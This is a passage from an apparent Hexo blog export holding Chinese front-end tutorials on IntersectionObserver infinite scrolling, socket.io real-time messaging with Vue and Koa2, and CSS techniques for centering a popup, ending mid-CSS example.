<h3 id="什么是交叉观察者"><a href="#什么是交叉观察者" class="headerlink" title="什么是交叉观察者"></a>什么是交叉观察者</h3><blockquote>
<p>根据官方的说明：IntersectionObserver接口 (从属于Intersection Observer API) 提供了一种异步观察目标元素与其祖先元素或顶级文档视窗(viewport)交叉状态的方法。祖先元素与视窗(viewport)被称为根(root)。<br>当一个IntersectionObserver对象被创建时，其被配置为监听根中一段给定比例的可见区域。一旦IntersectionObserver被创建，则无法更改其配置，所以一个给定的观察者对象只能用来监听可见区域的特定变化值；然而，你可以在同一个观察者对象中配置监听多个目标元素。<br>自己的理解的话就是监听指定的视窗和指定元素的位置关系 是否出现在视窗中</p>
</blockquote>
<h3 id="具体使用"><a href="#具体使用" class="headerlink" title="具体使用"></a>具体使用</h3><h4 id="1-构造函数"><a href="#1-构造函数" class="headerlink" title="1.构造函数"></a>1.构造函数</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">new</span> IntersectionObserver(callback, options)</span><br></pre></td></tr></table></figure>
<blockquote>
<p>callback：<br>发生交叉的回调，接受一个entries参数，返回当前已监听的目标集合 可以通过判断目标中的属性来判断是否发生交叉<br>options： 代表一些常用的配置属性</p>
</blockquote>
<table>
<thead>
<tr>
<th>属性</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>root</td>
<td>所监听对象的具体祖先元素(element)。如果未传入值或值为null，则默认使用顶级文档的视窗。</td>
</tr>
<tr>
<td>rootMargin</td>
<td>计算交叉时添加到根(root)边界盒bounding box的矩形偏移量， 可以有效的缩小或扩大根的判定范围从而满足计算需要。此属性返回的值可能与调用构造函数时指定的值不同，因此可能需要更改该值，以匹配内部要求。所有的偏移量均可用像素(pixel)(px)或百分比(percentage)(%)来表达, 默认值为”0px 0px 0px 0px”。</td>
</tr>
<tr>
<td>thresholds</td>
<td>一个包含阈值的列表, 按升序排列, 列表中的每个阈值都是监听对象的交叉区域与边界区域的比率。当监听对象的任何阈值被越过时，都会生成一个通知(Notification)。如果构造器未传入值, 则默认值为0。</td>
</tr>
</tbody>
</table>
<h4 id="callBack中的属性"><a href="#callBack中的属性" class="headerlink" title="callBack中的属性"></a>callBack中的属性</h4><blockquote>
<p>一个完整的创建一般如下所示：<br><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> IntersectionObserver(<span class="function"><span class="params">entries</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">let</span> item = entries[<span class="number">0</span>]</span><br><span class="line">      <span class="keyword">if</span> (item.isIntersecting) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'发生交叉'</span>)</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure></p>
<p>每个实例项中都会包含以下属性</p>
</blockquote>
<table>
<thead>
<tr>
<th>属性</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>boundingClientRect</td>
<td>返回包含目标元素的边界信息</td>
</tr>
<tr>
<td>intersectionRatio</td>
<td>返回intersectionRect 与 boundingClientRect 的比例值</td>
</tr>
<tr>
<td>intersectionRect</td>
<td>返回一个 DOMRectReadOnly 用来描述根和目标元素的相交区域</td>
</tr>
<tr>
<td>isIntersecting</td>
<td>返回一个布尔值, 如果目标元素与交叉区域观察者对象(intersection observer) 的根相交，则返回 true .如果返回 true, 则 IntersectionObserverEntry 描述了变换到交叉时的状态; 如果返回 false, 那么可以由此判断,变换是从交叉状态到非交叉状态.</td>
</tr>
<tr>
<td>time</td>
<td>返回一个记录从 IntersectionObserver 的时间原点(time origin)到交叉被触发的时间的时间戳(DOMHighResTimeStamp).</td>
</tr>
</tbody>
</table>
<h4 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h4><blockquote>
<p>利用创建出来的对象可以来监听、取消监听等操作 具体的方法列表如下</p>
</blockquote>
<table>
<thead>
<tr>
<th>方法</th>
<th>说明</th>
<th>参数</th>
</tr>
</thead>
<tbody>
<tr>
<td>observe</td>
<td>监听一个目标元素</td>
<td>节点</td>
</tr>
<tr>
<td>unobserve</td>
<td>取消监听一个目标元素</td>
<td>节点</td>
</tr>
<tr>
<td>takeRecords</td>
<td>返回所有监听的目标元素集合</td>
<td></td>
</tr>
<tr>
<td>disconnect</td>
<td>停止所有监听</td>
</tr>
</tbody>
</table>
<h3 id="具体例子"><a href="#具体例子" class="headerlink" title="具体例子"></a>具体例子</h3><blockquote>
<p>这个例子 主要是在react中的一个无限滚动的例子 具体的代码如下：</p>
</blockquote>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">componentDidMount () &#123;</span><br><span class="line">   <span class="keyword">this</span>.handleEnd()</span><br><span class="line">  &#125;</span><br><span class="line">  handleEnd () &#123;</span><br><span class="line">    <span class="keyword">let</span> obj = <span class="keyword">new</span> IntersectionObserver(<span class="function"><span class="params">entries</span> =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">let</span> item = entries[<span class="number">0</span>]</span><br><span class="line">      <span class="built_in">console</span>.log(item)</span><br><span class="line">      <span class="keyword">if</span> (item.isIntersecting) &#123;</span><br><span class="line">        getInfo().then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">          <span class="keyword">if</span> (res.data.status === <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">              list: <span class="keyword">this</span>.state.list.concat(res.data.data)</span><br><span class="line">            &#125;)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">    obj.observe(<span class="built_in">document</span>.querySelectorAll(<span class="string">'.foot'</span>)[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">this</span>.setState(&#123;</span><br><span class="line">      observer: obj</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p><img src="/images/observe.gif" alt="My Pic"></p>
<blockquote>
<p>这里主要是通过监听在列表最后的foot元素来实现的无限滚动加载，这里也可以通过监听列表的最后一个元素来实现，但是需要每次获取之后要重新监听<br><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/IntersectionObserverEntry" target="_blank" rel="noopener">官方文档</a></p>
</blockquote>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title>使用socket.io进行前后端实时通信</title>
    <url>/2019/09/08/%E4%BD%BF%E7%94%A8socket-io%E8%BF%9B%E8%A1%8C%E5%89%8D%E5%90%8E%E7%AB%AF%E5%AE%9E%E6%97%B6%E9%80%9A%E4%BF%A1/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;在一个论坛社区项目中有一个需求，就是需要实时推送用户收到的消息如（点赞、评论等）。要实现实时推送可以使用轮询，不断的请求接口查看是否有数据，这种方法比较浪费资源，不能确保每次轮询都会有数据。最好的解决方法应该是后端主动的来告诉我们有数据。这时就要用到websocket。<br><a id="more"></a></p>
<h3 id="websocket是什么"><a href="#websocket是什么" class="headerlink" title="websocket是什么"></a>websocket是什么</h3><hr>
<blockquote>
<p>Websocket是HTML5新增的一种全双工通信协议，客户端和服务端基于TCP握手连接成功后，两者之间就可以建立持久性的连接，实现双向数据传输。</p>
</blockquote>
<ul>
<li><p>有哪些优点</p>
<blockquote>
<ol>
<li>概括地说就是：支持双向通信，更灵活，更高效，可扩展性更好。</li>
<li>支持双向通信，实时性更强。</li>
<li>更好的二进制支持。</li>
<li>较少的控制开销。连接创建后，ws客户端、服务端进行数据交换时，协议控制的数据包头部较小。在不包含头部的情况下，服务端到客户端的包头只有2~10字节（取决于数据包长度），客户端到服务端的的话，需要加上额外的4字节的掩码。而HTTP协议每次通信都需要携带完整的头部。</li>
<li>支持扩展。ws协议定义了扩展，用户可以扩展协议，或者实现自定义的子协议。（比如支持自定义压缩算法等）</li>
</ol>
</blockquote>
</li>
<li><p>基本使用</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">const</span> ws = <span class="keyword">new</span> WebSocket(<span class="string">"ws//:xxx.xx"</span>, [protocol])</span><br><span class="line"></span><br><span class="line">ws.onopen = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    ws.send(<span class="string">'hello'</span>)</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'send'</span>)&#125;</span><br><span class="line"></span><br><span class="line">ws.onmessage = <span class="function">(<span class="params">ev</span>) =&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(ev.data)</span><br><span class="line">    ws.close()&#125;</span><br><span class="line"></span><br><span class="line">ws.onclose = <span class="function">(<span class="params">ev</span>) =&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'close'</span>)&#125;</span><br><span class="line"></span><br><span class="line">ws.onerror = <span class="function">(<span class="params">ev</span>) =&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'error'</span>)&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h3 id="socket-io"><a href="#socket-io" class="headerlink" title="socket.io"></a>socket.io</h3><hr>
<blockquote>
<p>实际应用中，如果需要Websocke进行双向数据通信，Socket.io是一个非常好的选择。其实github上面也有通过JS封装好的Websocket库，ws可用于client和基于node搭建的服务端使用，但是用起来相对繁琐，star相对Socket.io较少，所以不推荐使用。</p>
<p>Socket.io不是Websocket，它只是将Websocket和轮询 （Polling）机制以及其它的实时通信方式封装成了通用的接口，并且在服务端实现了这些实时机制的相应代码。也就是说，Websocket仅仅是 Socket.io实现实时通信的一个子集。因此Websocket客户端连接不上Socket.io服务端，当然Socket.io客户端也连接不上Websocket服务端。</p>
</blockquote>
<h3 id="socket-io使用demo"><a href="#socket-io使用demo" class="headerlink" title="socket.io使用demo"></a>socket.io使用demo</h3><hr>
<blockquote>
<p>demo技术构成</p>
<ul>
<li>前端vue全家桶</li>
<li>后端koa2+mongoDb</li>
</ul>
<p>最终效果<br>当前端没登录时推送一个hello给前端，当登录之后增加该用户的age之后推送当前age给当前登录的用户</p>
</blockquote>
<h4 id="前端搭建"><a href="#前端搭建" class="headerlink" title="前端搭建"></a>前端搭建</h4><ul>
<li><p>安装vue-cli之后修改main.js  (加入相应的拦截器 是否登录 以及拼接token)</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// The Vue build version to load with the `import` command</span></span><br><span class="line"><span class="comment">// (runtime-only or standalone) has been set in webpack.base.conf with an alias.</span></span><br><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"><span class="keyword">import</span> App <span class="keyword">from</span> <span class="string">'./App'</span></span><br><span class="line"><span class="keyword">import</span> router <span class="keyword">from</span> <span class="string">'./router'</span></span><br><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">'axios'</span></span><br><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">'./store'</span></span><br><span class="line">axios.defaults.withCredentials = <span class="literal">true</span></span><br><span class="line">axios.defaults.crossDomain = <span class="literal">true</span></span><br><span class="line">Vue.config.productionTip = <span class="literal">false</span></span><br><span class="line">axios.interceptors.request.use(<span class="function"><span class="params">config</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> token = localStorage.getItem(<span class="string">'token'</span>);</span><br><span class="line">  config.headers.common[<span class="string">'Authorization'</span>] = <span class="string">'Bearer '</span> + token;</span><br><span class="line">  <span class="keyword">return</span> config;</span><br><span class="line">&#125;)</span><br><span class="line">axios.interceptors.response.use(<span class="function">(<span class="params">response</span>)=&gt;</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(response.data.code == <span class="number">401</span>)&#123;</span><br><span class="line">    alert(<span class="string">'请登录在进行操作！'</span>)</span><br><span class="line">    localStorage.removeItem(<span class="string">'token'</span>)</span><br><span class="line">    router.push(<span class="string">'/'</span>)</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> response.data</span><br><span class="line">  &#125;</span><br><span class="line">&#125;, (error)=&gt;&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Promise</span>.reject(error)</span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">/* eslint-disable no-new */</span></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">  el: <span class="string">'#app'</span>,</span><br><span class="line">  router,</span><br><span class="line">  store,</span><br><span class="line">  components: &#123; App &#125;,</span><br><span class="line">  template: <span class="string">'&lt;App/&gt;'</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改HelloWorld.vue (主要是登录)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;hello&quot;&gt;</span><br><span class="line">    &lt;input type=&quot;text&quot; v-model=&quot;form.username&quot;/&gt;</span><br><span class="line">    &lt;input type=&quot;password&quot; v-model=&quot;form.password&quot; /&gt;</span><br><span class="line">    &lt;button @click=&quot;submit&quot;&gt;登录&lt;/button&gt;</span><br><span class="line">    &lt;span class=&quot;i1&quot;&gt;&lt;/span&gt;</span><br><span class="line">    &lt;i class=&quot;i2&quot;&gt;&lt;/i&gt;</span><br><span class="line">    &lt;i class=&quot;i3&quot;&gt;&lt;/i&gt;</span><br><span class="line">    &lt;i class=&quot;i4&quot;&gt;&lt;/i&gt;</span><br><span class="line">    &lt;i class=&quot;i5&quot;&gt;&lt;/i&gt;</span><br><span class="line">    &lt;i class=&quot;i6&quot;&gt;&lt;/i&gt;</span><br><span class="line">    &lt;i class=&quot;i7&quot;&gt;&lt;/i&gt;</span><br><span class="line">    &lt;i class=&quot;i8&quot;&gt;&lt;/i&gt;</span><br><span class="line">    &lt;i class=&quot;i9&quot;&gt;&lt;/i&gt;</span><br><span class="line">    &lt;i class=&quot;i10&quot;&gt;&lt;/i&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import axios from &apos;axios&apos;</span><br><span class="line">axios.defaults.withCredentials = true</span><br><span class="line">axios.defaults.crossDomain = true</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &apos;HelloWorld&apos;,</span><br><span class="line">  data () &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">      form: &#123;</span><br><span class="line">        username: &apos;&apos;,</span><br><span class="line">        password: &apos;&apos;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods: &#123;</span><br><span class="line">    submit () &#123;</span><br><span class="line">      if(!this.form.username || !this.form.password ) &#123;</span><br><span class="line">        alert(&apos;输入完整!&apos;)</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        axios.post(&apos;/api/login&apos;,&#123;</span><br><span class="line">          username: this.form.username,</span><br><span class="line">          password: this.form.password</span><br><span class="line">        &#125;).then(res =&gt; &#123;</span><br><span class="line">          if(res.code==200)&#123;</span><br><span class="line">            localStorage.setItem(&apos;token&apos;, res.data);</span><br><span class="line">            this.$store.commit(&apos;setSocket&apos;)</span><br><span class="line">            alert(&apos;登陆成功~&apos;)</span><br><span class="line">          &#125;else&#123;</span><br><span class="line">            alert(res.message)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  beforeCreate()&#123;</span><br><span class="line">    console.log(&apos;/ beforeCreate&apos;)</span><br><span class="line">  &#125;,</span><br><span class="line">  created () &#123;</span><br><span class="line">    console.log(&apos;/ create&apos;)</span><br><span class="line">  &#125;,</span><br><span class="line">  beforeMount () &#123;</span><br><span class="line">    console.log(&apos;/ beforeMount&apos;)</span><br><span class="line">  &#125;,</span><br><span class="line">  mounted () &#123;</span><br><span class="line">    console.log(&apos;/ mounted&apos;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>修改about页面 （主要是增加年龄）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;template&gt;</span><br><span class="line">  &lt;div class=&quot;about&quot;&gt;</span><br><span class="line">    &lt;h1&gt;about&lt;/h1&gt;</span><br><span class="line">    &lt;button @click=&quot;add&quot;&gt;ADD AGE&lt;/button&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/template&gt;</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">import axios from &apos;axios&apos;</span><br><span class="line">axios.defaults.withCredentials = true</span><br><span class="line">axios.defaults.crossDomain = true</span><br><span class="line">export default &#123;</span><br><span class="line">  name: &apos;HelloWorld&apos;,</span><br><span class="line">  data () &#123;</span><br><span class="line">    return &#123;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  methods:&#123;</span><br><span class="line">    add()&#123;</span><br><span class="line">      axios.get(&apos;/api/insert&apos;)</span><br><span class="line">      .then(res =&gt; &#123;</span><br><span class="line">        if(res !== undefined) &#123;</span><br><span class="line">          alert(res.message)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  mounted () &#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
</li>
<li><p>安装socket.io-client</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cnpm install socket.io-client --save</span><br></pre></td></tr></table></figure>
</li>
<li><p>在store中添加相应的连接的方法</p>
<blockquote>
<p>io方法中第一参数为后端暴露出来的路径  第二个为所携带的参数 更多参数可以参考后面的官方文档链接 on方法监听后端的事件</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">'vue'</span></span><br><span class="line"><span class="keyword">import</span> Vuex <span class="keyword">from</span> <span class="string">'vuex'</span></span><br><span class="line"><span class="keyword">import</span> io <span class="keyword">from</span> <span class="string">'socket.io-client'</span></span><br><span class="line">Vue.use(Vuex)</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">  state: &#123;</span><br><span class="line">    socket: <span class="literal">null</span>,</span><br><span class="line">    message: <span class="string">''</span></span><br><span class="line">  &#125;,</span><br><span class="line">  mutations: &#123;</span><br><span class="line">    setSocket (state) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!state.socket) &#123;</span><br><span class="line">        state.socket = io(<span class="string">`http://localhost:8888`</span>, &#123;</span><br><span class="line">          transports: [<span class="string">'websocket'</span>],</span><br><span class="line">          query: &#123;</span><br><span class="line">            token: <span class="string">'Bearer '</span> + localStorage.getItem(<span class="string">'token'</span>)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        state.socket.on(<span class="string">'message'</span>, msg =&gt; &#123;</span><br><span class="line">          state.message = msg</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        state.socket = io(<span class="string">`http://localhost:8888`</span>, &#123;</span><br><span class="line">          transports: [<span class="string">'websocket'</span>],</span><br><span class="line">          query: &#123;</span><br><span class="line">            token: <span class="string">'Bearer '</span> + localStorage.getItem(<span class="string">'token'</span>)</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        state.socket.on(<span class="string">'message'</span>, msg =&gt; &#123;</span><br><span class="line">          state.message = msg</span><br><span class="line">        &#125;)</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  actions: &#123;</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
</ul>
<h4 id="后端搭建"><a href="#后端搭建" class="headerlink" title="后端搭建"></a>后端搭建</h4><ul>
<li><p>安装socket.io</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cnpm install socket.io --save</span><br></pre></td></tr></table></figure>
</li>
<li><p>在app中引用并创建服务</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>);</span><br><span class="line"><span class="keyword">let</span> server = http.createServer(app);</span><br><span class="line"><span class="comment">//注意，websocket的握手是需要依赖http服务的，所以这里要把server传入进去。</span></span><br><span class="line">global.io = <span class="built_in">require</span>(<span class="string">'socket.io'</span>)(server);</span><br><span class="line">server.listen(<span class="number">8888</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>连接并监听事件和推送数据</p>
<blockquote>
<p>io.on监听前端的事件  io.emit触发事件推送hello给前端</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">io.on(<span class="string">'connection'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">socket</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(socket.id)</span><br><span class="line">  socket.on(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'服务端收到 : '</span>, data);</span><br><span class="line">      <span class="comment">//注意send()方法其实是发送一个 'message' 事件</span></span><br><span class="line">      <span class="comment">//客户端要通过on('message')来响应</span></span><br><span class="line">      socket.send(<span class="string">'你好客户端, '</span> + data);</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="comment">//发生错误时触发</span></span><br><span class="line">  socket.on(<span class="string">'error'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">err</span>) </span>&#123;</span><br><span class="line">      <span class="built_in">console</span>.log(err);</span><br><span class="line">  &#125;);</span><br><span class="line">  io.emit(<span class="string">'message'</span>, <span class="string">'hello'</span>)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
<li><p>在指定的情况下推送数据给指定用户</p>
<blockquote>
<p>这里的情况是增加年级时推送给当前用户年纪 handshake.query获取连接时的参数 通过连接时传的token来验证是哪个用户  使用io.socket.connected[id].emit像指定的socketId连接推送数据</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">exports.addAge = <span class="keyword">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">  <span class="keyword">let</span> token = ctx.headers.authorization</span><br><span class="line">  <span class="keyword">if</span> (token) &#123;</span><br><span class="line">    <span class="keyword">var</span> name = <span class="keyword">await</span> tools.verToken(token)</span><br><span class="line">    <span class="keyword">await</span> User.updateOneAsync(&#123; <span class="attr">_id</span>: name.userid &#125;, &#123; <span class="attr">$inc</span>: &#123; <span class="attr">age</span> : <span class="number">1</span> &#125;, <span class="attr">update_date</span>: moment().format(<span class="string">'YYYY-MM-DD HH:mm:ss'</span>) &#125;)</span><br><span class="line">    .then(<span class="keyword">async</span> res =&gt; &#123;</span><br><span class="line">      <span class="keyword">if</span>(res)&#123;</span><br><span class="line">        <span class="keyword">let</span> data = <span class="keyword">await</span> User.findOneAsync(&#123; <span class="attr">_id</span>: name.userid &#125;)</span><br><span class="line">        <span class="built_in">Object</span>.keys(global.io.sockets.sockets).map(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (global.io.sockets.sockets[item].handshake.query.token === token) &#123;</span><br><span class="line">                global.io.sockets.connected[item].emit(<span class="string">'message'</span>, data.age)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line">        ctx.body = &#123;</span><br><span class="line">          code: <span class="number">200</span>,</span><br><span class="line">          message: <span class="string">'添加成功~'</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        ctx.body = &#123;</span><br><span class="line">          code: <span class="number">200</span>,</span><br><span class="line">          message: <span class="string">'添加失败~'</span></span><br><span class="line">        &#125; </span><br><span class="line">      &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    ctx.body = &#123;</span><br><span class="line">      code: <span class="number">-200</span>,</span><br><span class="line">      message: <span class="string">'请登录~'</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
</ul>
<h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><ul>
<li><p>未登录状态</p>
<blockquote>
<p>连接之后推送hello</p>
<p><img src="/images/socket1.png" alt="My Pic"></p>
</blockquote>
</li>
<li><p>登录之后点击 增加age<br><img src="/images/socket2.png" alt="My Pic"><br><img src="/images/socket3.png" alt="My Pic"><br><img src="/images/socket4.png" alt="My Pic"></p>
</li>
<li><p>验证是否只推送给了指定的用户</p>
<blockquote>
<p>重开一个firefox浏览器登录另一个用户 两边分别增加age之后查看推送数据</p>
<p><img src="/images/socket5.png" alt="My Pic"><br><img src="/images/socket6.png" alt="My Pic"><br><img src="/images/socket7.png" alt="My Pic"></p>
</blockquote>
</li>
</ul>
<blockquote>
<p>最终实现进行某种操作之后推送数据给指定用户</p>
<p>相关链接<br><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/WebSocket" target="_blank" rel="noopener">websocket文档</a><br><a href="https://github.com/socketio/socket.io-client/blob/master/docs/API.md" target="_blank" rel="noopener">socket.io文档</a></p>
</blockquote>
]]></content>
      <categories>
        <category>socket.io</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>实时通信</tag>
      </tags>
  </entry>
  <entry>
    <title>保持浮层水平垂直居中</title>
    <url>/2018/03/23/%E4%BF%9D%E6%8C%81%E6%B5%AE%E5%B1%82%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E5%B1%85%E4%B8%AD/</url>
    <content><![CDATA[<p>&nbsp;&nbsp;&nbsp;&nbsp;我们经常可以看到网页中的某些弹框，弹出之后无论我们缩小或放大，它都始终保持在浏览器垂直居中的位置。那么如何实现呢？下面是一些比较常用的方法。<br>其中html中的代码都是一样的，如下:<br><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>  <span class="attr">class</span>=<span class="string">"parent"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"chiren"</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
<a id="more"></a>
<h1 id="1-利用flex布局"><a href="#1-利用flex布局" class="headerlink" title="1.利用flex布局"></a>1.利用flex布局</h1><p>相信大家都使用过或者知道flex,flex布局会有一个父容器和子元素，其中父容器和子元素都有各自的属性。实现响应式布局。<a href="https://www.cnblogs.com/subying/p/3661807.html" target="_blank" rel="noopener">flex链接</a><br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.parent</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">37.5rem</span><span class="comment">/* 600px */</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#09c</span>;</span><br><span class="line">    <span class="attribute">display</span>: flex;</span><br><span class="line">    <span class="attribute">justify-content</span>:center;     <span class="comment">/* 水平居中 */</span></span><br><span class="line">    <span class="attribute">align-items</span>:center;         <span class="comment">/* 垂直居中 */</span></span><br><span class="line">    <span class="comment">/* flex-direction:column; */</span>    <span class="comment">/* 一列显示 */</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.chiren</span>&#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">background-color</span>: <span class="number">#eee</span>;</span><br><span class="line">    <span class="attribute">border</span>: <span class="number">1px</span> dashed <span class="number">#000</span>;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">5px</span>;</span><br><span class="line">    <span class="comment">/*如果children下面还有子元素的话，可以嵌套使用*/</span></span><br><span class="line">    <span class="comment">/* display: flex;</span></span><br><span class="line"><span class="comment">    justify-content: center;</span></span><br><span class="line"><span class="comment">    align-items:center;  */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>效果如下:<br> <img src="/images/flex.png" alt="My Pic"></p>
<h1 id="2-利用绝对定位与transform"><a href="#2-利用绝对定位与transform" class="headerlink" title="2.利用绝对定位与transform"></a>2.利用绝对定位与transform</h1><p>绝对定位我们肯定都使用过，就是position:absolute;而transform中的translate(x,y)可以实现元素的移动。我们先看看单独使用绝对定位的效果<br><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.chiren</span>&#123;</span><br><span class="line">	<span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">background-color</span>:red;  </span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.parent</span>&#123;</span><br><span class="line">　　<span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span 